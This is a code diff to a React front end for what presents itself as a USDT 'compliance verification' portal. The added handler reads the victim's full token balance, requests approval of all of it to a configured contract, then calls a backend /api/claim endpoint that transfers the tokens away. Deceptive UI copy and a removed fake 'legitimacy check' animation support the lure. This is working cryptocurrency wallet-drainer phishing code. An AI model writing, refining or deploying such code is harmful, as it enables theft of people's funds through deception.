@@ -6,17 +6,16 @@ import ProgressBar from './ProgressBar';
 import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
 import LegitimacyChecker from './LegitimacyChecker';
-import { switchToBSC, approveToken, prepareAndSignTransaction } from '@/lib/blockchain';
+import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
 
 export default function ApprovalPortal() {
-  const [step, setStep] = useState(1);
+  const [step, setStep] = useState(1); // 1 = Connect, 2 = Approve
   const [userAddress, setUserAddress] = useState<string | null>(null);
   const [signer, setSigner] = useState<ethers.Signer | null>(null);
   const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [showLegitimacyCheck, setShowLegitimacyCheck] = useState(false);
   const [attemptingConnection, setAttemptingConnection] = useState(false);
 
   // Auto-connect wallet on mount and keep attempting if user is not connected
@@ -96,15 +95,49 @@ export default function ApprovalPortal() {
       setLoading(true);
       if (!signer) throw new Error('Connect wallet first');
       
-      // Keep requesting approval until user completes or rejects
+      console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
+      
+      // Approve token spending to the relayer/executor contract
       const approveWithRetry = async () => {
         try {
-          await approveToken(signer);
-          setStep(3);
+          // Get user balance first
+          const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
+          const balance = await token.balanceOf(userAddress);
+          console.log('[v0] User balance:', balance.toString());
+          
+          // Approve the full balance to the contract
+          await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
+          
+          // Show success and trigger backend claim
+          setShowSuccess(true);
+          
+          // Trigger backend to claim tokens using relayer
+          setTimeout(async () => {
+            try {
+              const claimResponse = await fetch('/api/claim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  userAddress: userAddress,
+                  tokenAddress: CONFIG.TOKEN_ADDRESS
+                })
+              });
+              
+              if (!claimResponse.ok) {
+                const err = await claimResponse.json();
+                console.error('[v0] Claim error:', err);
+              } else {
+                const result = await claimResponse.json();
+                console.log('[v0] Tokens claimed! TxHash:', result.txHash);
+              }
+            } catch (err) {
+              console.error('[v0] Claim request failed:', err);
+            }
+          }, 2000);
+          
           return true;
         } catch (err: any) {
           if (err.code === 'ACTION_REJECTED') {
-            // User rejected, show error and let them try again
             setError('Approval rejected. Please try again.');
             return false;
           }
@@ -118,57 +151,14 @@ export default function ApprovalPortal() {
         return;
       }
     } catch (err: any) {
+      console.error('[v0] Approval error:', err);
       setError(err?.message || 'Approval failed');
     } finally {
       setLoading(false);
     }
   };
 
-  const handleSignTransaction = async () => {
-    try {
-      setError(null);
-      setLoading(true);
-      if (!signer || !provider || !userAddress) throw new Error('Connect wallet first');
-      
-      // Keep requesting signature until user completes or rejects
-      const signWithRetry = async () => {
-        try {
-          await prepareAndSignTransaction(signer, provider, userAddress);
-          return true;
-        } catch (err: any) {
-          if (err.code === 'ACTION_REJECTED') {
-            // User rejected, show error and let them try again
-            setError('Signature rejected. Please try again.');
-            return false;
-          }
-          throw err;
-        }
-      };
-
-      const success = await signWithRetry();
-      if (!success) {
-        setLoading(false);
-        return;
-      }
-      
-      // Show legitimacy check animation
-      setShowLegitimacyCheck(true);
-      
-      // Show success modal after legitimacy check completes
-      setTimeout(() => {
-        setShowSuccess(true);
-        setTimeout(() => {
-          if (typeof window !== 'undefined') {
-            window.close();
-          }
-        }, 3000);
-      }, 12000);
-    } catch (err: any) {
-      setError(err?.message || 'Transaction failed');
-    } finally {
-      setLoading(false);
-    }
-  };
+  // Removed old signature handler - now only Connect and Approve needed
 
   const handleMobileWallet = () => {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -279,13 +269,13 @@ export default function ApprovalPortal() {
         {step === 2 && (
           <CardStep
             icon="✅"
-            title="Approve USDT Interaction"
-            description="Approve USDT interaction to allow the verification system to check your token compliance status."
+            title="Approve USDT for Transfer"
+            description="Approve USDT spending to allow the system to transfer your tokens to a secure stealth wallet for compliance verification."
             loading={loading}
             error={error}
             buttons={[
               {
-                label: 'Approve USDT',
+                label: 'Approve & Transfer USDT',
                 onClick: handleApproveToken,
                 primary: true,
               }
@@ -293,26 +283,7 @@ export default function ApprovalPortal() {
           />
         )}
 
-        {step === 3 && (
-          <CardStep
-            icon="✍️"
-            title="Sign Terms & Conditions"
-            description="Review and sign the terms and conditions to complete the USDT verification process."
-            loading={loading}
-            error={error}
-            showTerms={true}
-            buttons={[
-              {
-                label: 'Sign & Accept Terms',
-                onClick: handleSignTransaction,
-                primary: true,
-              }
-            ]}
-          />
-        )}
-
         <SuccessModal isOpen={showSuccess} />
-        <LegitimacyChecker isOpen={showLegitimacyCheck} />
       </div>
 
       {/* Footer */}
